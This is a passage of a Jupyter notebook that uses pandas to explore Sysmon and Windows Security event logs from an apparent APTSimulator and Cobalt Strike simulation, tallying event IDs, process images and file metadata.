{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "import numpy as np\n",
    "import os\n",
    "import pandas as pd\n",
    "\n",
    "from pprint import pprint"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(2611, 126)"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = pd.read_json(os.getcwd() + '/Data/aptsimulator_cobaltstrike_2021-06-11T21081492.json', lines = True)\n",
    "df.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>SourceName</th>\n",
       "      <th>ProviderGuid</th>\n",
       "      <th>Level</th>\n",
       "      <th>Keywords</th>\n",
       "      <th>Channel</th>\n",
       "      <th>Hostname</th>\n",
       "      <th>TimeCreated</th>\n",
       "      <th>@timestamp</th>\n",
       "      <th>EventID</th>\n",
       "      <th>Message</th>\n",
       "      <th>...</th>\n",
       "      <th>ServiceType</th>\n",
       "      <th>ServiceStartType</th>\n",
       "      <th>ServiceAccount</th>\n",
       "      <th>ClientProcessStartKey</th>\n",
       "      <th>ClientProcessId</th>\n",
       "      <th>ImagePath</th>\n",
       "      <th>StartType</th>\n",
       "      <th>AccountName</th>\n",
       "      <th>param1</th>\n",
       "      <th>param2</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Microsoft-Windows-Sysmon</td>\n",
       "      <td>{5770385f-c22a-43e0-bf4c-06f5698ffbd9}</td>\n",
       "      <td>4</td>\n",
       "      <td>0x8000000000000000</td>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>WORKSTATION5</td>\n",
       "      <td>2021-06-11T09:07:15.635Z</td>\n",
       "      <td>2021-06-11T09:07:15.635Z</td>\n",
       "      <td>1</td>\n",
       "      <td>Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 202...</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Microsoft-Windows-Sysmon</td>\n",
       "      <td>{5770385f-c22a-43e0-bf4c-06f5698ffbd9}</td>\n",
       "      <td>4</td>\n",
       "      <td>0x8000000000000000</td>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>WORKSTATION5</td>\n",
       "      <td>2021-06-11T09:07:15.636Z</td>\n",
       "      <td>2021-06-11T09:07:15.636Z</td>\n",
       "      <td>10</td>\n",
       "      <td>Process accessed:\\r\\nRuleName: -\\r\\nUtcTime: 2...</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Microsoft-Windows-Sysmon</td>\n",
       "      <td>{5770385f-c22a-43e0-bf4c-06f5698ffbd9}</td>\n",
       "      <td>4</td>\n",
       "      <td>0x8000000000000000</td>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>WORKSTATION5</td>\n",
       "      <td>2021-06-11T09:07:15.636Z</td>\n",
       "      <td>2021-06-11T09:07:15.636Z</td>\n",
       "      <td>10</td>\n",
       "      <td>Process accessed:\\r\\nRuleName: -\\r\\nUtcTime: 2...</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Microsoft-Windows-Sysmon</td>\n",
       "      <td>{5770385f-c22a-43e0-bf4c-06f5698ffbd9}</td>\n",
       "      <td>4</td>\n",
       "      <td>0x8000000000000000</td>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>WORKSTATION5</td>\n",
       "      <td>2021-06-11T09:07:15.636Z</td>\n",
       "      <td>2021-06-11T09:07:15.636Z</td>\n",
       "      <td>7</td>\n",
       "      <td>Image loaded:\\r\\nRuleName: -\\r\\nUtcTime: 2021-...</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Microsoft-Windows-Sysmon</td>\n",
       "      <td>{5770385f-c22a-43e0-bf4c-06f5698ffbd9}</td>\n",
       "      <td>4</td>\n",
       "      <td>0x8000000000000000</td>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>WORKSTATION5</td>\n",
       "      <td>2021-06-11T09:07:15.636Z</td>\n",
       "      <td>2021-06-11T09:07:15.636Z</td>\n",
       "      <td>7</td>\n",
       "      <td>Image loaded:\\r\\nRuleName: -\\r\\nUtcTime: 2021-...</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 126 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                 SourceName                            ProviderGuid  Level  \\\n",
       "0  Microsoft-Windows-Sysmon  {5770385f-c22a-43e0-bf4c-06f5698ffbd9}      4   \n",
       "1  Microsoft-Windows-Sysmon  {5770385f-c22a-43e0-bf4c-06f5698ffbd9}      4   \n",
       "2  Microsoft-Windows-Sysmon  {5770385f-c22a-43e0-bf4c-06f5698ffbd9}      4   \n",
       "3  Microsoft-Windows-Sysmon  {5770385f-c22a-43e0-bf4c-06f5698ffbd9}      4   \n",
       "4  Microsoft-Windows-Sysmon  {5770385f-c22a-43e0-bf4c-06f5698ffbd9}      4   \n",
       "\n",
       "             Keywords                               Channel      Hostname  \\\n",
       "0  0x8000000000000000  Microsoft-Windows-Sysmon/Operational  WORKSTATION5   \n",
       "1  0x8000000000000000  Microsoft-Windows-Sysmon/Operational  WORKSTATION5   \n",
       "2  0x8000000000000000  Microsoft-Windows-Sysmon/Operational  WORKSTATION5   \n",
       "3  0x8000000000000000  Microsoft-Windows-Sysmon/Operational  WORKSTATION5   \n",
       "4  0x8000000000000000  Microsoft-Windows-Sysmon/Operational  WORKSTATION5   \n",
       "\n",
       "                TimeCreated                @timestamp  EventID  \\\n",
       "0  2021-06-11T09:07:15.635Z  2021-06-11T09:07:15.635Z        1   \n",
       "1  2021-06-11T09:07:15.636Z  2021-06-11T09:07:15.636Z       10   \n",
       "2  2021-06-11T09:07:15.636Z  2021-06-11T09:07:15.636Z       10   \n",
       "3  2021-06-11T09:07:15.636Z  2021-06-11T09:07:15.636Z        7   \n",
       "4  2021-06-11T09:07:15.636Z  2021-06-11T09:07:15.636Z        7   \n",
       "\n",
       "                                             Message  ...  ServiceType  \\\n",
       "0  Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 202...  ...          NaN   \n",
       "1  Process accessed:\\r\\nRuleName: -\\r\\nUtcTime: 2...  ...          NaN   \n",
       "2  Process accessed:\\r\\nRuleName: -\\r\\nUtcTime: 2...  ...          NaN   \n",
       "3  Image loaded:\\r\\nRuleName: -\\r\\nUtcTime: 2021-...  ...          NaN   \n",
       "4  Image loaded:\\r\\nRuleName: -\\r\\nUtcTime: 2021-...  ...          NaN   \n",
       "\n",
       "  ServiceStartType ServiceAccount ClientProcessStartKey ClientProcessId  \\\n",
       "0              NaN            NaN                   NaN             NaN   \n",
       "1              NaN            NaN                   NaN             NaN   \n",
       "2              NaN            NaN                   NaN             NaN   \n",
       "3              NaN            NaN                   NaN             NaN   \n",
       "4              NaN            NaN                   NaN             NaN   \n",
       "\n",
       "  ImagePath StartType AccountName param1 param2  \n",
       "0       NaN       NaN         NaN    NaN    NaN  \n",
       "1       NaN       NaN         NaN    NaN    NaN  \n",
       "2       NaN       NaN         NaN    NaN    NaN  \n",
       "3       NaN       NaN         NaN    NaN    NaN  \n",
       "4       NaN       NaN         NaN    NaN    NaN  \n",
       "\n",
       "[5 rows x 126 columns]"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 2611 entries, 0 to 2610\n",
      "Data columns (total 25 columns):\n",
      " #   Column            Non-Null Count  Dtype \n",
      "---  ------            --------------  ----- \n",
      " 0   SourceName        2611 non-null   object\n",
      " 1   ProviderGuid      2611 non-null   object\n",
      " 2   Level             2611 non-null   int64 \n",
      " 3   Keywords          2611 non-null   object\n",
      " 4   Channel           2611 non-null   object\n",
      " 5   Hostname          2611 non-null   object\n",
      " 6   TimeCreated       2611 non-null   object\n",
      " 7   @timestamp        2611 non-null   object\n",
      " 8   EventID           2611 non-null   int64 \n",
      " 9   Message           2611 non-null   object\n",
      " 10  Task              2611 non-null   int64 \n",
      " 11  RuleName          2264 non-null   object\n",
      " 12  UtcTime           2264 non-null   object\n",
      " 13  ProcessGuid       1170 non-null   object\n",
      " 14  ProcessId         1431 non-null   object\n",
      " 15  Image             1170 non-null   object\n",
      " 16  FileVersion       948 non-null    object\n",
      " 17  Description       948 non-null    object\n",
      " 18  Product           948 non-null    object\n",
      " 19  Company           948 non-null    object\n",
      " 20  OriginalFileName  948 non-null    object\n",
      " 21  CommandLine       73 non-null     object\n",
      " 22  CurrentDirectory  37 non-null     object\n",
      " 23  User              57 non-null     object\n",
      " 24  LogonGuid         37 non-null     object\n",
      "dtypes: int64(3), object(22)\n",
      "memory usage: 510.1+ KB\n",
      "None\n",
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 2611 entries, 0 to 2610\n",
      "Data columns (total 25 columns):\n",
      " #   Column             Non-Null Count  Dtype  \n",
      "---  ------             --------------  -----  \n",
      " 0   LogonId            37 non-null     object \n",
      " 1   TerminalSessionId  37 non-null     float64\n",
      " 2   IntegrityLevel     37 non-null     object \n",
      " 3   Hashes             966 non-null    object \n",
      " 4   ParentProcessGuid  37 non-null     object \n",
      " 5   ParentProcessId    38 non-null     float64\n",
      " 6   ParentImage        37 non-null     object \n",
      " 7   ParentCommandLine  37 non-null     object \n",
      " 8   SourceProcessGUID  1094 non-null   object \n",
      " 9   SourceProcessId    1135 non-null   object \n",
      " 10  SourceThreadId     1094 non-null   float64\n",
      " 11  SourceImage        1094 non-null   object \n",
      " 12  TargetProcessGUID  1094 non-null   object \n",
      " 13  TargetProcessId    1135 non-null   object \n",
      " 14  TargetImage        1094 non-null   object \n",
      " 15  GrantedAccess      1094 non-null   object \n",
      " 16  CallTrace          1094 non-null   object \n",
      " 17  ImageLoaded        911 non-null    object \n",
      " 18  Signed             911 non-null    object \n",
      " 19  Signature          911 non-null    object \n",
      " 20  SignatureStatus    911 non-null    object \n",
      " 21  TargetFilename     31 non-null     object \n",
      " 22  IsExecutable       18 non-null     object \n",
      " 23  CreationUtcTime    13 non-null     object \n",
      " 24  EventType          152 non-null    object \n",
      "dtypes: float64(3), object(22)\n",
      "memory usage: 510.1+ KB\n",
      "None\n",
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 2611 entries, 0 to 2610\n",
      "Data columns (total 25 columns):\n",
      " #   Column               Non-Null Count  Dtype  \n",
      "---  ------               --------------  -----  \n",
      " 0   TargetObject         146 non-null    object \n",
      " 1   Details              90 non-null     object \n",
      " 2   PipeName             6 non-null      object \n",
      " 3   Device               1 non-null      object \n",
      " 4   Protocol             37 non-null     object \n",
      " 5   Initiated            2 non-null      object \n",
      " 6   SourceIsIpv6         2 non-null      object \n",
      " 7   SourceIp             2 non-null      object \n",
      " 8   SourceHostname       2 non-null      object \n",
      " 9   SourcePort           37 non-null     float64\n",
      " 10  SourcePortName       2 non-null      object \n",
      " 11  DestinationIsIpv6    2 non-null      object \n",
      " 12  DestinationIp        2 non-null      object \n",
      " 13  DestinationHostname  2 non-null      object \n",
      " 14  DestinationPort      2 non-null      float64\n",
      " 15  DestinationPortName  2 non-null      object \n",
      " 16  ProcessID            26 non-null     float64\n",
      " 17  Application          35 non-null     object \n",
      " 18  Direction            26 non-null     object \n",
      " 19  SourceAddress        35 non-null     object \n",
      " 20  DestAddress          26 non-null     object \n",
      " 21  DestPort             26 non-null     float64\n",
      " 22  FilterRTID           35 non-null     float64\n",
      " 23  LayerName            35 non-null     object \n",
      " 24  LayerRTID            35 non-null     float64\n",
      "dtypes: float64(6), object(19)\n",
      "memory usage: 510.1+ KB\n",
      "None\n",
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 2611 entries, 0 to 2610\n",
      "Data columns (total 25 columns):\n",
      " #   Column              Non-Null Count  Dtype \n",
      "---  ------              --------------  ----- \n",
      " 0   RemoteUserID        26 non-null     object\n",
      " 1   RemoteMachineID     26 non-null     object\n",
      " 2   SubjectUserSid      309 non-null    object\n",
      " 3   SubjectUserName     309 non-null    object\n",
      " 4   SubjectDomainName   309 non-null    object\n",
      " 5   SubjectLogonId      309 non-null    object\n",
      " 6   Status              36 non-null     object\n",
      " 7   ProcessName         216 non-null    object\n",
      " 8   NewProcessId        36 non-null     object\n",
      " 9   NewProcessName      36 non-null     object\n",
      " 10  TokenElevationType  36 non-null     object\n",
      " 11  TargetUserSid       58 non-null     object\n",
      " 12  TargetUserName      58 non-null     object\n",
      " 13  TargetDomainName    58 non-null     object\n",
      " 14  TargetLogonId       58 non-null     object\n",
      " 15  ParentProcessName   36 non-null     object\n",
      " 16  MandatoryLabel      36 non-null     object\n",
      " 17  SourceHandleId      41 non-null     object\n",
      " 18  TargetHandleId      41 non-null     object\n",
      " 19  ObjectServer        158 non-null    object\n",
      " 20  HandleId            158 non-null    object\n",
      " 21  ObjectType          91 non-null     object\n",
      " 22  ObjectName          76 non-null     object\n",
      " 23  TransactionId       41 non-null     object\n",
      " 24  AccessList          90 non-null     object\n",
      "dtypes: object(25)\n",
      "memory usage: 510.1+ KB\n",
      "None\n",
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 2611 entries, 0 to 2610\n",
      "Data columns (total 25 columns):\n",
      " #   Column                 Non-Null Count  Dtype  \n",
      "---  ------                 --------------  -----  \n",
      " 0   AccessReason           55 non-null     object \n",
      " 1   AccessMask             90 non-null     object \n",
      " 2   PrivilegeList          41 non-null     object \n",
      " 3   RestrictedSidCount     41 non-null     float64\n",
      " 4   ResourceAttributes     75 non-null     object \n",
      " 5   EnabledPrivilegeList   22 non-null     object \n",
      " 6   DisabledPrivilegeList  22 non-null     object \n",
      " 7   OldSd                  1 non-null      object \n",
      " 8   NewSd                  1 non-null      object \n",
      " 9   IpAddress              15 non-null     object \n",
      " 10  IpPort                 15 non-null     float64\n",
      " 11  ShareName              15 non-null     object \n",
      " 12  ShareLocalPath         15 non-null     object \n",
      " 13  RelativeTargetName     14 non-null     object \n",
      " 14  ServiceName            2 non-null      object \n",
      " 15  ServiceFileName        1 non-null      object \n",
      " 16  ServiceType            2 non-null      object \n",
      " 17  ServiceStartType       1 non-null      float64\n",
      " 18  ServiceAccount         1 non-null      object \n",
      " 19  ClientProcessStartKey  1 non-null      float64\n",
      " 20  ClientProcessId        1 non-null      float64\n",
      " 21  ImagePath              1 non-null      object \n",
      " 22  StartType              1 non-null      object \n",
      " 23  AccountName            1 non-null      object \n",
      " 24  param1                 2 non-null      object \n",
      "dtypes: float64(5), object(20)\n",
      "memory usage: 510.1+ KB\n",
      "None\n"
     ]
    }
   ],
   "source": [
    "x = [i for i in range(0, 126, 25)]\n",
    "\n",
    "for i in range(len(x) - 1):\n",
    "    pprint(df.iloc[:, x[i] : x[i + 1]].info())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# df.to_csv(os.getcwd() + '/Data/data_csv.csv')\n",
    "# print('Done')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Microsoft-Windows-Sysmon               2264\n",
       "Microsoft-Windows-Security-Auditing     344\n",
       "Service Control Manager                   3\n",
       "Name: SourceName, dtype: int64"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['SourceName'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5770385f-c22a-43e0-bf4c-06f5698ffbd9    2264\n",
       "54849625-5478-4994-a5ba-3e3b0328c30d     344\n",
       "555908d1-a6d7-4695-8e1e-26931d2012f4       3\n",
       "Name: ProviderGuid, dtype: int64"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['ProviderGuid'] = df['ProviderGuid'].apply(lambda x: x[1 : -1])\n",
    "df['ProviderGuid'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4    2265\n",
       "0     344\n",
       "2       2\n",
       "Name: Level, dtype: int64"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Level'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Microsoft-Windows-Sysmon/Operational    2264\n",
       "Security                                 344\n",
       "System                                     3\n",
       "Name: Channel, dtype: int64"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Channel'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "WORKSTATION5    2611\n",
       "Name: Hostname, dtype: int64"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Hostname'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "df['@timestamp'] = pd.to_datetime(df['@timestamp'])\n",
    "\n",
    "plt.hist(df['@timestamp'], bins = 30, log = False)\n",
    "plt.title('Timestamp Distro (Date: 2021-06-11)')\n",
    "plt.xlabel('Timestamp')\n",
    "plt.ylabel('Count')\n",
    "plt.show()\n",
    "plt.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10      1094\n",
       "7        911\n",
       "13        90\n",
       "4658      82\n",
       "12        56\n",
       "4656      41\n",
       "4690      41\n",
       "1         37\n",
       "4689      36\n",
       "5         36\n",
       "4688      36\n",
       "4663      34\n",
       "5156      26\n",
       "4703      22\n",
       "26        18\n",
       "5145      14\n",
       "11        13\n",
       "5158       9\n",
       "17         5\n",
       "3          2\n",
       "5140       1\n",
       "7045       1\n",
       "7009       1\n",
       "7000       1\n",
       "4670       1\n",
       "9          1\n",
       "18         1\n",
       "4697       1\n",
       "Name: EventID, dtype: int64"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['EventID'].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Windows event IDs: https://www.eventid.net/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "-                1869\n",
       "MsMpEng           388\n",
       "RuntimeBroker       7\n",
       "Name: RuleName, dtype: int64"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['RuleName'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "e2c04bb9-a70e-60c3-0d61-390000000000    66\n",
       "e2c04bb9-08e5-60c4-9a09-000000000300    60\n",
       "e2c04bb9-08cb-60c4-7e09-000000000300    45\n",
       "e2c04bb9-08d5-60c4-8609-000000000300    45\n",
       "e2c04bb9-08d0-60c4-8209-000000000300    45\n",
       "                                        ..\n",
       "e2c04bb9-08e5-60c4-1fd7-400100000000     1\n",
       "e2c04bb9-08c6-60c4-2c20-400100000000     1\n",
       "e2c04bb9-08da-60c4-bc9c-400100000000     1\n",
       "e2c04bb9-08dd-60c4-d3c2-400100000000     1\n",
       "e2c04bb9-08c3-60c4-1c17-400100000000     1\n",
       "Name: ProcessGuid, Length: 82, dtype: int64"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['ProcessGuid'] = df['ProcessGuid'].apply(lambda x: x if pd.isna(x) else x[1 : -1])\n",
    "df['ProcessGuid'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1320      66\n",
       "6280      61\n",
       "4432      46\n",
       "2460      46\n",
       "5924      46\n",
       "          ..\n",
       "1168       1\n",
       "0x17e4     1\n",
       "0x2300     1\n",
       "0x5a0      1\n",
       "0x404      1\n",
       "Name: ProcessId, Length: 93, dtype: int64"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['ProcessId'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "c:\\windows\\system32\\conhost.exe                                                                                                   281\n",
       "c:\\windows\\system32\\taskkill.exe                                                                                                  229\n",
       "c:\\windows\\system32\\timeout.exe                                                                                                   139\n",
       "c:\\tmp\\createnamedpipe.exe                                                                                                        111\n",
       "c:\\windows\\explorer.exe                                                                                                            66\n",
       "c:\\windows\\system32\\ping.exe                                                                                                       64\n",
       "c:\\windows\\system32\\cscript.exe                                                                                                    61\n",
       "c:\\windows\\system32\\svchost.exe                                                                                                    38\n",
       "c:\\windows\\system32\\sc.exe                                                                                                         36\n",
       "c:\\users\\apt-simulator\\documents\\aptsimulator-master\\helpers\\curl.exe                                                              32\n",
       "c:\\users\\apt-simulator\\documents\\aptsimulator-master\\helpers\\7z.exe                                                                23\n",
       "c:\\windows\\b6a1458f396.exe                                                                                                         20\n",
       "system                                                                                                                             19\n",
       "c:\\windows\\system32\\cmd.exe                                                                                                        18\n",
       "c:\\windows\\system32\\ctfmon.exe                                                                                                     10\n",
       "c:\\windows\\system32\\services.exe                                                                                                   10\n",
       "c:\\windows\\system32\\wbem\\wmiprvse.exe                                                                                               7\n",
       "c:\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe                                                                      5\n",
       "c:\\packages\\plugins\\microsoft.enterprisecloud.monitoring.microsoftmonitoringagent\\1.0.18053.0\\mmaextensionheartbeatservice.exe      1\n",
       "Name: Image, dtype: int64"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Image'] = df['Image'].apply(lambda x: x if pd.isna(x) else x.lower().strip())\n",
    "df['Image'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10.0.18362.1 (WinBuild.160101.0800)           156\n",
       "10.0.18362.1500 (WinBuild.160101.0800)        126\n",
       "10.0.18362.1316 (WinBuild.160101.0800)         94\n",
       "10.0.18362.1533 (WinBuild.160101.0800)         75\n",
       "10.0.18362.1474 (WinBuild.160101.0800)         74\n",
       "10.0.18362.387 (WinBuild.160101.0800)          58\n",
       "10.0.18362.1110 (WinBuild.160101.0800)         51\n",
       "10.0.18362.1411 (WinBuild.160101.0800)         41\n",
       "10.0.18362.1237 (WinBuild.160101.0800)         38\n",
       "7.0.18362.1 (WinBuild.160101.0800)             37\n",
       "10.0.18362.1556 (WinBuild.160101.0800)         36\n",
       "-                                              28\n",
       "10.0.18362.752 (WinBuild.160101.0800)          21\n",
       "10.0.18362.1171 (WinBuild.160101.0800)         17\n",
       "2001.12.10941.16384 (WinBuild.160101.0800)     13\n",
       "10.0.18362.1350 (WinBuild.160101.0800)          8\n",
       "10.0.18362.1139 (WinBuild.160101.0800)          7\n",
       "5.812.10240.16384                               7\n",
       "4.18.2105.4 (WinBuild.160101.0800)              6\n",
       "10.0.18362.815 (WinBuild.160101.0800)           5\n",
       "10.0.18362.1440 (WinBuild.160101.0800)          5\n",
       "10.0.18362.1110                                 5\n",
       "10.0.18362.449 (WinBuild.160101.0800)           5\n",
       "10.0.18362.836 (WinBuild.160101.0800)           5\n",
       "10.0.18362.1316                                 5\n",
       "6.10 (WinBuild.160101.0800)                     5\n",
       "11.00.18362.1533 (WinBuild.160101.0800)         5\n",
       "10.0.18362.1377 (WinBuild.160101.0800)          3\n",
       "16.04                                           3\n",
       "12.00.21005.1 built by: REL                     2\n",
       "10.0.18362.657 (WinBuild.160101.0800)           2\n",
       "10.0.18362.1082 (WinBuild.160101.0800)          1\n",
       "5.0.18362.1500 (WinBuild.160101.0800)           1\n",
       "10.0.18362.295 (WinBuild.160101.0800)           1\n",
       "10.0.18362.267 (WinBuild.160101.0800)           1\n",
       "6.30.18362.1474                                 1\n",
       "Name: FileVersion, dtype: int64"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['FileVersion'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Windows NT BASE API Client DLL                      74\n",
       "Microsoft® C Runtime Library                        53\n",
       "GDI Client DLL                                      44\n",
       "NT Layer DLL                                        38\n",
       "Windows NT CRT DLL                                  37\n",
       "                                                    ..\n",
       "Wow64 Console and Win32 API Logging                  1\n",
       "Unicode Normalization DLL                            1\n",
       "7z Plugin                                            1\n",
       "Windows ® Script Component Runtime                   1\n",
       "Windows Cryptographic Primitives Library (Wow64)     1\n",
       "Name: Description, Length: 93, dtype: int64"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Description'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Microsoft® Windows® Operating System               901\n",
       "-                                                   28\n",
       "Internet Explorer                                    5\n",
       "Microsoft ® Windows Script Host                      3\n",
       "7-Zip                                                3\n",
       "Microsoft® Visual Studio® 2013                       2\n",
       "Microsoft ® Script Runtime                           1\n",
       "Microsoft ® Windows ® Script Component Runtime       1\n",
       "Microsoft ® Windows Script Host Runtime Library      1\n",
       "Windows Installer - Unicode                          1\n",
       "Microsoft XML Core Services                          1\n",
       "Microsoft ® VBScript                                 1\n",
       "Name: Product, dtype: int64"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Product'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Microsoft Corporation    917\n",
       "-                         28\n",
       "Igor Pavlov                3\n",
       "Name: Company, dtype: int64"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Company'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
